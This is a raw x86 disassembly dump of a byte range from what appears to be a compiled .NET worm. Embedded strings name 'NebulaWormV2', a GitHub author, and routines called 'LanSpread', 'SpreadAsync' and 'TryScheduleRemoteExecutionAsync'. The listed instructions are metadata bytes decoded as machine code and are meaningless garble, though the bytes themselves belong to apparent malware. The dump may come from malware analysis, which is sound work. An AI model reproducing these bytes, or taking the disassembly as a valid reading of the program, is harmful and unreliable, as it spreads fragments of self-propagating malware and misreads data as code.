  40ad38:	11 81 dd 05 00 00    	adc    %eax,0x5dd(%ecx)
  40ad3e:	12 81 e1 06 20 01    	adc    0x12006e1(%ecx),%al
  40ad44:	01 12                	add    %edx,(%edx)
  40ad46:	81 e1 06 20 01 02    	and    $0x2012006,%ecx
  40ad4c:	11 81 e9 05 07 01    	adc    %eax,0x10705e9(%ecx)
  40ad52:	11 80 94 05 0a 01    	adc    %eax,0x10a0594(%eax)
  40ad58:	11 80 94 0a 07 05    	adc    %eax,0x5070a94(%eax)
  40ad5e:	0e                   	push   %cs
  40ad5f:	1d 0e 08 0e 12       	sbb    $0x120e080e,%eax
  40ad64:	80 fd 06             	cmp    $0x6,%ch
  40ad67:	00 03                	add    %al,(%ebx)
  40ad69:	01 0e                	add    %ecx,(%esi)
  40ad6b:	0e                   	push   %cs
  40ad6c:	02 05 20 01 0e 1d    	add    0x1d0e0120,%al
  40ad72:	03 08                	add    (%eax),%ecx
  40ad74:	00 03                	add    %al,(%ebx)
  40ad76:	02 0e                	add    (%esi),%cl
  40ad78:	0e                   	push   %cs
  40ad79:	11 81 dd 08 15 12    	adc    %eax,0x121508dd(%ecx)
  40ad7f:	81 09 01 12 80 9d    	orl    $0x9d801201,(%ecx)
  40ad85:	05 20 00 11 80       	add    $0x80110020,%eax
  40ad8a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40ad8b:	10 00                	adc    %al,(%eax)
  40ad8d:	02 12                	add    (%edx),%dl
  40ad8f:	80 9d 15 12 81 09 01 	sbbb   $0x1,0x9811215(%ebp)
  40ad96:	12 80 9d 11 80 a5    	adc    -0x5a7fee63(%eax),%al
  40ad9c:	05 07 01 11 80       	add    $0x80110107,%eax
  40ada1:	9c                   	pushf
  40ada2:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40ada7:	9c                   	pushf
  40ada8:	06                   	push   %es
  40ada9:	00 01                	add    %al,(%ecx)
  40adab:	01 11                	add    %edx,(%ecx)
  40adad:	81 f1 03 00 00 01    	xor    $0x1000003,%ecx
  40adb3:	05 07 01 11 80       	add    $0x80110107,%eax
  40adb8:	a8 05                	test   $0x5,%al
  40adba:	0a 01                	or     (%ecx),%al
  40adbc:	11 80 a8 08 07 04    	adc    %eax,0x40708a8(%eax)
  40adc2:	1d 03 12 55 02       	sbb    $0x2551203,%eax
  40adc7:	08 06                	or     %al,(%esi)
  40adc9:	00 02                	add    %al,(%edx)
  40adcb:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40adce:	02 04 00             	add    (%eax,%eax,1),%al
  40add1:	01 01                	add    %eax,(%ecx)
  40add3:	1c 0e                	sbb    $0xe,%al
  40add5:	07                   	pop    %es
  40add6:	07                   	pop    %es
  40add7:	0e                   	push   %cs
  40add8:	1d 12 81 15 08       	sbb    $0x8158112,%eax
  40addd:	12 81 15 0e 0e 0e    	adc    0xe0e0e15(%ecx),%al
  40ade3:	06                   	push   %es
  40ade4:	00 00                	add    %al,(%eax)
  40ade6:	1d 12 81 15 05       	sbb    $0x5158112,%eax
  40adeb:	20 00                	and    %al,(%eax)
  40aded:	11 81 f9 05 20 00    	adc    %eax,0x2005f9(%ecx)
  40adf3:	12 81 fd 07 07 03    	adc    0x30707fd(%ecx),%al
  40adf9:	0e                   	push   %cs
  40adfa:	0e                   	push   %cs
  40adfb:	11 80 8d 0e 07 04    	adc    %eax,0x4070e8d(%eax)
  40ae01:	12 80 d1 12 80 d5    	adc    -0x2a7fed2f(%eax),%al
  40ae07:	12 80 d9 12 80 85    	adc    -0x7a7fed27(%eax),%al
  40ae0d:	06                   	push   %es
  40ae0e:	20 01                	and    %al,(%ecx)
  40ae10:	01 11                	add    %edx,(%ecx)
  40ae12:	82 05 06 20 01 01 11 	addb   $0x11,0x1012006
  40ae19:	82 09 06             	orb    $0x6,(%ecx)
  40ae1c:	00 01                	add    %al,(%ecx)
  40ae1e:	11 80 c9 0d 06 20    	adc    %eax,0x20060dc9(%eax)
  40ae24:	01 01                	add    %eax,(%ecx)
  40ae26:	11 80 c9 07 20 02    	adc    %eax,0x22007c9(%eax)
  40ae2c:	01 0e                	add    %ecx,(%esi)
  40ae2e:	12 80 d1 06 20 01    	adc    0x12006d1(%eax),%al
  40ae34:	12 80 85 0e 0c 20    	adc    0x200c0e85(%eax),%al
  40ae3a:	03 12                	add    (%edx),%edx
  40ae3c:	80 85 0e 12 80 85 12 	addb   $0x12,-0x7a7fedf2(%ebp)
  40ae43:	82 11 05             	adcb   $0x5,(%ecx)
  40ae46:	07                   	pop    %es
  40ae47:	01 11                	add    %edx,(%ecx)
  40ae49:	80 b4 05 0a 01 11 80 	xorb   $0xb4,-0x7feefef6(%ebp,%eax,1)
  40ae50:	b4 
  40ae51:	09 07                	or     %eax,(%edi)
  40ae53:	04 08                	add    $0x8,%al
  40ae55:	11 80 e9 08 12 69    	adc    %eax,0x691208e9(%eax)
  40ae5b:	08 00                	or     %al,(%eax)
  40ae5d:	01 12                	add    %edx,(%edx)
  40ae5f:	80 9d 12 80 cd 05 20 	sbbb   $0x20,0x5cd8012(%ebp)
  40ae66:	00 11                	add    %dl,(%ecx)
  40ae68:	80 e9 0a             	sub    $0xa,%cl
  40ae6b:	30 02                	xor    %al,(%edx)
  40ae6d:	02 01                	add    (%ecx),%al
  40ae6f:	10 1e                	adc    %bl,(%esi)
  40ae71:	00 10                	add    %dl,(%eax)
  40ae73:	1e                   	push   %ds
  40ae74:	01 08                	add    %ecx,(%eax)
  40ae76:	0a 02                	or     (%edx),%al
  40ae78:	11 80 e9 11 80 88    	adc    %eax,-0x777fee17(%eax)
  40ae7e:	08 15 12 80 f5 01    	or     %dl,0x1f58012
  40ae84:	12 80 9d 06 00 03    	adc    0x300069d(%eax),%al
  40ae8a:	0e                   	push   %cs
  40ae8b:	0e                   	push   %cs
  40ae8c:	1c 1c                	sbb    $0x1c,%al
  40ae8e:	0d 00 01 12 80       	or     $0x80120100,%eax
  40ae93:	9d                   	popf
  40ae94:	15 12 81 09 01       	adc    $0x1098112,%eax
  40ae99:	12 80 9d 05 20 01    	adc    0x120059d(%eax),%al
  40ae9f:	01 13                	add    %edx,(%ebx)
  40aea1:	00 0d 00 01 12 80    	add    %cl,0x80120100
  40aea7:	9d                   	popf
  40aea8:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40aead:	12 80 9d 05 20 01    	adc    0x120059d(%eax),%al
  40aeb3:	01 12                	add    %edx,(%edx)
  40aeb5:	69 08 07 03 08 11    	imul   $0x11080307,(%eax),%ecx
  40aebb:	80 e9 12             	sub    $0x12,%cl
  40aebe:	69 08 0a 02 11 80    	imul   $0x8011020a,(%eax),%ecx
  40aec4:	e9 11 80 8c 08       	jmp    0x8cd2eda
  40aec9:	0a 02                	or     (%edx),%al
  40aecb:	11 80 e9 11 80 94    	adc    %eax,-0x6b7fee17(%eax)
  40aed1:	05 07 01 11 80       	add    $0x80110107,%eax
  40aed6:	b8 05 0a 01 11       	mov    $0x11010a05,%eax
  40aedb:	80 b8 10 07 04 08 12 	cmpb   $0x12,0x8040710(%eax)
  40aee2:	80 9d 15 11 81 11 01 	sbbb   $0x1,0x11811115(%ebp)
  40aee9:	12 80 9d 12 69 06    	adc    0x669129d(%eax),%al
  40aeef:	00 01                	add    %al,(%ecx)
  40aef1:	12 80 9d 08 0e 00    	adc    0xe089d(%eax),%al
  40aef7:	01 15 12 82 15 01    	add    %edx,0x1158212
  40aefd:	12 80 9d 1d 12 80    	adc    -0x7fede263(%eax),%al
  40af03:	9d                   	popf
  40af04:	08 15 12 82 15 01    	or     %dl,0x1158212
  40af0a:	12 80 9d 09 20 00    	adc    0x20099d(%eax),%al
  40af10:	15 11 81 11 01       	adc    $0x1118111,%eax
  40af15:	13 00                	adc    (%eax),%eax
  40af17:	08 15 11 81 11 01    	or     %dl,0x1118111
  40af1d:	12 80 9d 0d 0a 02    	adc    0x20a0d9d(%eax),%al
  40af23:	15 11 81 11 01       	adc    $0x1118111,%eax
  40af28:	12 80 9d 11 80 9c    	adc    -0x637fee63(%eax),%al
  40af2e:	04 20                	add    $0x20,%al
  40af30:	00 13                	add    %dl,(%ebx)
  40af32:	00 05 07 01 11 80    	add    %al,0x80110107
  40af38:	bc 05 0a 01 11       	mov    $0x11010a05,%esp
  40af3d:	80 bc 0d 07 06 08 0e 	cmpb   $0x12,0xe080607(%ebp,%ecx,1)
  40af44:	12 
  40af45:	80 a4 0e 11 80 e9 12 	andb   $0x69,0x12e98011(%esi,%ecx,1)
  40af4c:	69 
  40af4d:	08 0a                	or     %cl,(%edx)
  40af4f:	02 11                	add    (%ecx),%dl
  40af51:	80 e9 11             	sub    $0x11,%cl
  40af54:	80 a8 0f 07 08 08 12 	subb   $0x12,0x808070f(%eax)
  40af5b:	80 84 0e 0e 11 80 e9 	addb   $0x1c,-0x167feef2(%esi,%ecx,1)
  40af62:	1c 
  40af63:	08 12                	or     %dl,(%edx)
  40af65:	69 06 00 02 01 0e    	imul   $0xe010200,(%esi),%eax
  40af6b:	11 59 08             	adc    %ebx,0x8(%ecx)
  40af6e:	0a 02                	or     (%edx),%al
  40af70:	11 80 e9 11 80 b4    	adc    %eax,-0x4b7fee17(%eax)
  40af76:	07                   	pop    %es
  40af77:	00 01                	add    %al,(%ecx)
  40af79:	12 82 19 12 69 10    	adc    0x10691219(%edx),%al
  40af7f:	07                   	pop    %es
  40af80:	07                   	pop    %es
  40af81:	08 08                	or     %cl,(%eax)
  40af83:	11 80 e9 11 59 1d    	adc    %eax,0x1d5911e9(%eax)
  40af89:	12 80 9d 08 12 69    	adc    0x6912089d(%eax),%al
  40af8f:	09 00                	or     %eax,(%eax)
  40af91:	02 12                	add    (%edx),%dl
  40af93:	80 9d 08 11 80 a5 08 	sbbb   $0x8,-0x5a7feef8(%ebp)
  40af9a:	0a 02                	or     (%edx),%al
  40af9c:	11 80 e9 11 80 b8    	adc    %eax,-0x477fee17(%eax)
  40afa2:	09 00                	or     %eax,(%eax)
  40afa4:	01 12                	add    %edx,(%edx)
  40afa6:	80 9d 1d 12 80 9d 0b 	sbbb   $0xb,-0x627fede3(%ebp)
  40afad:	07                   	pop    %es
  40afae:	04 08                	add    $0x8,%al
  40afb0:	11 80 e9 11 80 a5    	adc    %eax,-0x5a7fee17(%eax)
  40afb6:	12 69 08             	adc    0x8(%ecx),%ch
  40afb9:	0a 02                	or     (%edx),%al
  40afbb:	11 80 e9 11 80 bc    	adc    %eax,-0x437fee17(%eax)
  40afc1:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  40afc7:	34 e0                	xor    $0xe0,%al
  40afc9:	89 08                	mov    %ecx,(%eax)
  40afcb:	b0 3f                	mov    $0x3f,%al
  40afcd:	5f                   	pop    %edi
  40afce:	7f 11                	jg     0x40afe1
  40afd0:	d5 0a                	aad    $0xa
  40afd2:	3a 04 ff             	cmp    (%edi,%edi,8),%al
  40afd5:	0f 1f 00             	nopl   (%eax)
  40afd8:	04 00                	add    $0x0,%al
  40afda:	10 00                	adc    %al,(%eax)
  40afdc:	00 04 00             	add    %al,(%eax,%eax,1)
  40afdf:	20 00                	and    %al,(%eax)
  40afe1:	00 04 40             	add    %al,(%eax,%eax,2)
  40afe4:	00 00                	add    %al,(%eax)
  40afe6:	00 04 00             	add    %al,(%eax,%eax,1)
  40afe9:	00 00                	add    %al,(%eax)
  40afeb:	00 04 28             	add    %al,(%eax,%ebp,1)
  40afee:	00 00                	add    %al,(%eax)
  40aff0:	00 04 b3             	add    %al,(%ebx,%esi,4)
  40aff3:	15 00 00 80 9e       	adc    $0x9e800000,%eax
  40aff8:	2e 01 80 84 53 79 73 	add    %eax,%cs:0x73795384(%eax)
  40afff:	74 65                	je     0x40b066
  40b001:	6d                   	insl   (%dx),%es:(%edi)
  40b002:	2e 53                	cs push %ebx
  40b004:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40b008:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  40b00f:	6d 
  40b010:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  40b017:	2e 53                	cs push %ebx
  40b019:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40b01d:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  40b024:	69 
  40b025:	73 73                	jae    0x40b09a
  40b027:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40b02e:	69 62 75 74 65 2c 20 	imul   $0x202c6574,0x75(%edx),%esp
  40b035:	6d                   	insl   (%dx),%es:(%edi)
  40b036:	73 63                	jae    0x40b09b
  40b038:	6f                   	outsl  %ds:(%esi),(%dx)
  40b039:	72 6c                	jb     0x40b0a7
  40b03b:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  40b042:	73 69                	jae    0x40b0ad
  40b044:	6f                   	outsl  %ds:(%esi),(%dx)
  40b045:	6e                   	outsb  %ds:(%esi),(%dx)
  40b046:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  40b04b:	30 2e                	xor    %ch,(%esi)
  40b04d:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  40b050:	43                   	inc    %ebx
  40b051:	75 6c                	jne    0x40b0bf
  40b053:	74 75                	je     0x40b0ca
  40b055:	72 65                	jb     0x40b0bc
  40b057:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40b05c:	72 61                	jb     0x40b0bf
  40b05e:	6c                   	insb   (%dx),%es:(%edi)
  40b05f:	2c 20                	sub    $0x20,%al
  40b061:	50                   	push   %eax
  40b062:	75 62                	jne    0x40b0c6
  40b064:	6c                   	insb   (%dx),%es:(%edi)
  40b065:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  40b06c:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  40b070:	62 37                	bound  %esi,(%edi)
  40b072:	37                   	aaa
  40b073:	61                   	popa
  40b074:	35 63 35 36 31       	xor    $0x31363563,%eax
  40b079:	39 33                	cmp    %esi,(%ebx)
  40b07b:	34 65                	xor    $0x65,%al
  40b07d:	30 38                	xor    %bh,(%eax)
  40b07f:	39 15 01 54 02 10    	cmp    %edx,0x10025401
  40b085:	53                   	push   %ebx
  40b086:	6b 69 70 56          	imul   $0x56,0x70(%ecx),%ebp
  40b08a:	65 72 69             	gs jb  0x40b0f6
  40b08d:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  40b093:	6f                   	outsl  %ds:(%esi),(%dx)
  40b094:	6e                   	outsb  %ds:(%esi),(%dx)
  40b095:	01 03                	add    %eax,(%ebx)
  40b097:	06                   	push   %es
  40b098:	12 55 02             	adc    0x2(%ebp),%dl
  40b09b:	06                   	push   %es
  40b09c:	02 02                	add    (%edx),%al
  40b09e:	06                   	push   %es
  40b09f:	09 03                	or     %eax,(%ebx)
  40b0a1:	06                   	push   %es
  40b0a2:	12 71 03             	adc    0x3(%ecx),%dh
  40b0a5:	06                   	push   %es
  40b0a6:	1d 0e 02 06 08       	sbb    $0x806020e,%eax
  40b0ab:	04 06                	add    $0x6,%al
  40b0ad:	12 80 91 03 06 1d    	adc    0x1d060391(%eax),%al
  40b0b3:	05 04 06 11 80       	add    $0x80110604,%eax
  40b0b8:	ac                   	lods   %ds:(%esi),%al
  40b0b9:	04 06                	add    $0x6,%al
  40b0bb:	11 80 b0 03 06 11    	adc    %eax,0x110603b0(%eax)
  40b0c1:	59                   	pop    %ecx
  40b0c2:	03 06                	add    (%esi),%eax
  40b0c4:	12 5d 03             	adc    0x3(%ebp),%bl
  40b0c7:	06                   	push   %es
  40b0c8:	12 78 04             	adc    0x4(%eax),%bh
  40b0cb:	06                   	push   %es
  40b0cc:	12 80 cd 04 06 12    	adc    0x120604cd(%eax),%al
  40b0d2:	80 dd 04             	sbb    $0x4,%ch
  40b0d5:	06                   	push   %es
  40b0d6:	12 80 80 04 06 11    	adc    0x11060480(%eax),%al
  40b0dc:	80 ed 04             	sub    $0x4,%ch
  40b0df:	06                   	push   %es
  40b0e0:	12 80 84 09 06 15    	adc    0x15060984(%eax),%al
  40b0e6:	12 80 f5 01 12 80    	adc    -0x7fedfe0b(%eax),%al
  40b0ec:	9d                   	popf
  40b0ed:	04 06                	add    $0x6,%al
  40b0ef:	11 80 e9 04 06 12    	adc    %eax,0x120604e9(%eax)
  40b0f5:	80 90 04 06 12 80 98 	adcb   $0x98,-0x7fedf9fc(%eax)
  40b0fc:	09 06                	or     %eax,(%esi)
  40b0fe:	15 12 81 09 01       	adc    $0x1098112,%eax
  40b103:	12 80 9d 04 06 12    	adc    0x1206049d(%eax),%al
  40b109:	80 ad 04 06 12 80 9d 	subb   $0x9d,-0x7fedf9fc(%ebp)
  40b110:	09 06                	or     %eax,(%esi)
  40b112:	15 11 81 11 01       	adc    $0x1118111,%eax
  40b117:	12 80 9d 04 06 12    	adc    0x1206049d(%eax),%al
  40b11d:	80 a0 02 06 1c 05 00 	andb   $0x0,0x51c0602(%eax)
  40b124:	02 18                	add    (%eax),%bl
  40b126:	18 0e                	sbb    %cl,(%esi)
  40b128:	04 00                	add    $0x0,%al
  40b12a:	01 18                	add    %ebx,(%eax)
  40b12c:	0e                   	push   %cs
  40b12d:	08 00                	or     %al,(%eax)
  40b12f:	04 02                	add    $0x2,%al
  40b131:	18 19                	sbb    %bl,(%ecx)
  40b133:	09 10                	or     %edx,(%eax)
  40b135:	09 06                	or     %eax,(%esi)
  40b137:	00 03                	add    %al,(%ebx)
  40b139:	18 09                	sbb    %cl,(%ecx)
  40b13b:	02 08                	add    (%eax),%cl
  40b13d:	08 00                	or     %al,(%eax)
  40b13f:	05 18 18 18 09       	add    $0x9181818,%eax
  40b144:	09 09                	or     %ecx,(%ecx)
  40b146:	0a 00                	or     (%eax),%al
  40b148:	05 02 18 18 1d       	add    $0x1d181802,%eax
  40b14d:	05 09 10 18 0b       	add    $0xb181009,%eax
  40b152:	00 07                	add    %al,(%edi)
  40b154:	18 18                	sbb    %bl,(%eax)
  40b156:	18 09                	sbb    %cl,(%ecx)
  40b158:	18 18                	sbb    %bl,(%eax)
  40b15a:	09 10                	or     %edx,(%eax)
  40b15c:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40b15f:	01 02                	add    %eax,(%edx)
  40b161:	18 06                	sbb    %al,(%esi)
  40b163:	00 02                	add    %al,(%edx)
  40b165:	02 0e                	add    (%esi),%cl
  40b167:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40b16c:	01 1d 0e 06 00 03    	add    %ebx,0x300060e
  40b172:	09 02                	or     %eax,(%edx)
  40b174:	02 02                	add    (%edx),%al
  40b176:	05 00 00 12 80       	add    $0x80120000,%eax
  40b17b:	9d                   	popf
  40b17c:	06                   	push   %es
  40b17d:	00 01                	add    %al,(%ecx)
  40b17f:	01 11                	add    %edx,(%ecx)
  40b181:	80 a5 06 00 03 02 0e 	andb   $0xe,0x2030006(%ebp)
  40b188:	08 08                	or     %cl,(%eax)
  40b18a:	07                   	pop    %es
  40b18b:	00 02                	add    %al,(%edx)
  40b18d:	12 80 9d 0e 0e 05    	adc    0x50e0e9d(%eax),%al
  40b193:	00 02                	add    %al,(%edx)
  40b195:	02 0e                	add    (%esi),%cl
  40b197:	0e                   	push   %cs
  40b198:	04 00                	add    $0x0,%al
  40b19a:	01 0e                	add    %ecx,(%esi)
  40b19c:	08 06                	or     %al,(%esi)
  40b19e:	00 03                	add    %al,(%ebx)
  40b1a0:	01 0e                	add    %ecx,(%esi)
  40b1a2:	0e                   	push   %cs
  40b1a3:	0e                   	push   %cs
  40b1a4:	04 20                	add    $0x20,%al
  40b1a6:	01 0e                	add    %ecx,(%esi)
  40b1a8:	08 08                	or     %cl,(%eax)
  40b1aa:	01 00                	add    %eax,(%eax)
  40b1ac:	08 00                	or     %al,(%eax)
  40b1ae:	00 00                	add    %al,(%eax)
  40b1b0:	00 00                	add    %al,(%eax)
  40b1b2:	1e                   	push   %ds
  40b1b3:	01 00                	add    %eax,(%eax)
  40b1b5:	01 00                	add    %eax,(%eax)
  40b1b7:	54                   	push   %esp
  40b1b8:	02 16                	add    (%esi),%dl
  40b1ba:	57                   	push   %edi
  40b1bb:	72 61                	jb     0x40b21e
  40b1bd:	70 4e                	jo     0x40b20d
  40b1bf:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1c0:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1c1:	45                   	inc    %ebp
  40b1c2:	78 63                	js     0x40b227
  40b1c4:	65 70 74             	gs jo  0x40b23b
  40b1c7:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40b1ce:	77 73                	ja     0x40b243
  40b1d0:	01 08                	add    %ecx,(%eax)
  40b1d2:	01 00                	add    %eax,(%eax)
  40b1d4:	02 00                	add    (%eax),%al
  40b1d6:	00 00                	add    %al,(%eax)
  40b1d8:	00 00                	add    %al,(%eax)
  40b1da:	11 01                	adc    %eax,(%ecx)
  40b1dc:	00 0c 4e             	add    %cl,(%esi,%ecx,2)
  40b1df:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b1e3:	61                   	popa
  40b1e4:	57                   	push   %edi
  40b1e5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1e6:	72 6d                	jb     0x40b255
  40b1e8:	56                   	push   %esi
  40b1e9:	32 00                	xor    (%eax),%al
  40b1eb:	00 05 01 00 00 00    	add    %al,0x1
  40b1f1:	00 0b                	add    %cl,(%ebx)
  40b1f3:	01 00                	add    %eax,(%eax)
  40b1f5:	06                   	push   %es
  40b1f6:	4e                   	dec    %esi
  40b1f7:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b1fb:	61                   	popa
  40b1fc:	00 00                	add    %al,(%eax)
  40b1fe:	20 01                	and    %al,(%ecx)
  40b200:	00 1b                	add    %bl,(%ebx)
  40b202:	4d                   	dec    %ebp
  40b203:	61                   	popa
  40b204:	64 65 20 42 79       	fs and %al,%gs:0x79(%edx)
  40b209:	20 47 69             	and    %al,0x69(%edi)
  40b20c:	74 68                	je     0x40b276
  40b20e:	75 62                	jne    0x40b272
  40b210:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  40b214:	2f                   	das
  40b215:	6b 65 65 67          	imul   $0x67,0x65(%ebp),%esp
  40b219:	61                   	popa
  40b21a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b21b:	33 31                	xor    (%ecx),%esi
  40b21d:	00 00                	add    %al,(%eax)
  40b21f:	29 01                	sub    %eax,(%ecx)
  40b221:	00 24 64             	add    %ah,(%esp,%eiz,2)
  40b224:	36 39 35 62 32 62 64 	cmp    %esi,%ss:0x64623262
  40b22b:	2d 35 62 38 61       	sub    $0x61386235,%eax
  40b230:	2d 34 36 66 34       	sub    $0x34663634,%eax
  40b235:	2d 38 33 64 32       	sub    $0x32643338,%eax
  40b23a:	2d 37 33 30 34       	sub    $0x34303337,%eax
  40b23f:	33 32                	xor    (%edx),%esi
  40b241:	35 37 62 37 38       	xor    $0x38376237,%eax
  40b246:	35 00 00 0c 01       	xor    $0x10c0000,%eax
  40b24b:	00 07                	add    %al,(%edi)
  40b24d:	31 2e                	xor    %ebp,(%esi)
  40b24f:	30 2e                	xor    %ch,(%esi)
  40b251:	30 2e                	xor    %ch,(%esi)
  40b253:	30 00                	xor    %al,(%eax)
  40b255:	00 4d 01             	add    %cl,0x1(%ebp)
  40b258:	00 1c 2e             	add    %bl,(%esi,%ebp,1)
  40b25b:	4e                   	dec    %esi
  40b25c:	45                   	inc    %ebp
  40b25d:	54                   	push   %esp
  40b25e:	46                   	inc    %esi
  40b25f:	72 61                	jb     0x40b2c2
  40b261:	6d                   	insl   (%dx),%es:(%edi)
  40b262:	65 77 6f             	gs ja  0x40b2d4
  40b265:	72 6b                	jb     0x40b2d2
  40b267:	2c 56                	sub    $0x56,%al
  40b269:	65 72 73             	gs jb  0x40b2df
  40b26c:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40b273:	37                   	aaa
  40b274:	2e 32 01             	xor    %cs:(%ecx),%al
  40b277:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40b27b:	46                   	inc    %esi
  40b27c:	72 61                	jb     0x40b2df
  40b27e:	6d                   	insl   (%dx),%es:(%edi)
  40b27f:	65 77 6f             	gs ja  0x40b2f1
  40b282:	72 6b                	jb     0x40b2ef
  40b284:	44                   	inc    %esp
  40b285:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40b28c:	61                   	popa
  40b28d:	6d                   	insl   (%dx),%es:(%edi)
  40b28e:	65 14 2e             	gs adc $0x2e,%al
  40b291:	4e                   	dec    %esi
  40b292:	45                   	inc    %ebp
  40b293:	54                   	push   %esp
  40b294:	20 46 72             	and    %al,0x72(%esi)
  40b297:	61                   	popa
  40b298:	6d                   	insl   (%dx),%es:(%edi)
  40b299:	65 77 6f             	gs ja  0x40b30b
  40b29c:	72 6b                	jb     0x40b309
  40b29e:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40b2a1:	37                   	aaa
  40b2a2:	2e 32 2b             	xor    %cs:(%ebx),%ch
  40b2a5:	01 00                	add    %eax,(%eax)
  40b2a7:	26 4e                	es dec %esi
  40b2a9:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b2ad:	61                   	popa
  40b2ae:	57                   	push   %edi
  40b2af:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2b0:	72 6d                	jb     0x40b31f
  40b2b2:	2e 4c                	cs dec %esp
  40b2b4:	61                   	popa
  40b2b5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2b6:	53                   	push   %ebx
  40b2b7:	70 72                	jo     0x40b32b
  40b2b9:	65 61                	gs popa
  40b2bb:	64 2b 3c 53          	sub    %fs:(%ebx,%edx,2),%edi
  40b2bf:	70 72                	jo     0x40b333
  40b2c1:	65 61                	gs popa
  40b2c3:	64 41                	fs inc %ecx
  40b2c5:	73 79                	jae    0x40b340
  40b2c7:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2c8:	63 3e                	arpl   %edi,(%esi)
  40b2ca:	64 5f                	fs pop %edi
  40b2cc:	5f                   	pop    %edi
  40b2cd:	38 00                	cmp    %al,(%eax)
  40b2cf:	00 40 01             	add    %al,0x1(%eax)
  40b2d2:	00 3b                	add    %bh,(%ebx)
  40b2d4:	4e                   	dec    %esi
  40b2d5:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b2d9:	61                   	popa
  40b2da:	57                   	push   %edi
  40b2db:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2dc:	72 6d                	jb     0x40b34b
  40b2de:	2e 4c                	cs dec %esp
  40b2e0:	61                   	popa
  40b2e1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2e2:	53                   	push   %ebx
  40b2e3:	70 72                	jo     0x40b357
  40b2e5:	65 61                	gs popa
  40b2e7:	64 2b 3c 54          	sub    %fs:(%esp,%edx,2),%edi
  40b2eb:	72 79                	jb     0x40b366
  40b2ed:	53                   	push   %ebx
  40b2ee:	63 68 65             	arpl   %ebp,0x65(%eax)
  40b2f1:	64 75 6c             	fs jne 0x40b360
  40b2f4:	65 52                	gs push %edx
  40b2f6:	65 6d                	gs insl (%dx),%es:(%edi)
  40b2f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2f9:	74 65                	je     0x40b360
  40b2fb:	45                   	inc    %ebp
  40b2fc:	78 65                	js     0x40b363
  40b2fe:	63 75 74             	arpl   %esi,0x74(%ebp)
  40b301:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  40b308:	63 3e                	arpl   %edi,(%esi)
  40b30a:	64 5f                	fs pop %edi
  40b30c:	5f                   	pop    %edi
  40b30d:	31 36                	xor    %esi,(%esi)
  40b30f:	00 00                	add    %al,(%eax)
  40b311:	22 01                	and    (%ecx),%al
  40b313:	00 1d 4e 65 62 75    	add    %bl,0x7562654e
  40b319:	6c                   	insb   (%dx),%es:(%edi)
  40b31a:	61                   	popa
  40b31b:	57                   	push   %edi
  40b31c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b31d:	72 6d                	jb     0x40b38c
  40b31f:	2e 50                	cs push %eax
  40b321:	72 6f                	jb     0x40b392
  40b323:	67 72 61             	addr16 jb 0x40b387
  40b326:	6d                   	insl   (%dx),%es:(%edi)
  40b327:	2b 3c 4d 61 69 6e 3e 	sub    0x3e6e6961(,%ecx,2),%edi
  40b32e:	64 5f                	fs pop %edi
  40b330:	5f                   	pop    %edi
  40b331:	31 00                	xor    %eax,(%eax)
  40b333:	00 04 01             	add    %al,(%ecx,%eax,1)
  40b336:	00 00                	add    %al,(%eax)
  40b338:	00 34 01             	add    %dh,(%ecx,%eax,1)
  40b33b:	00 2f                	add    %ch,(%edi)
  40b33d:	4e                   	dec    %esi
  40b33e:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b342:	61                   	popa
  40b343:	57                   	push   %edi
  40b344:	6f                   	outsl  %ds:(%esi),(%dx)
  40b345:	72 6d                	jb     0x40b3b4
  40b347:	2e 53                	cs push %ebx
  40b349:	6c                   	insb   (%dx),%es:(%edi)
  40b34a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b34b:	77 57                	ja     0x40b3a4
  40b34d:	69 2b 3c 4f 70 65    	imul   $0x65704f3c,(%ebx),%ebp
  40b353:	6e                   	outsb  %ds:(%esi),(%dx)
  40b354:	46                   	inc    %esi
  40b355:	61                   	popa
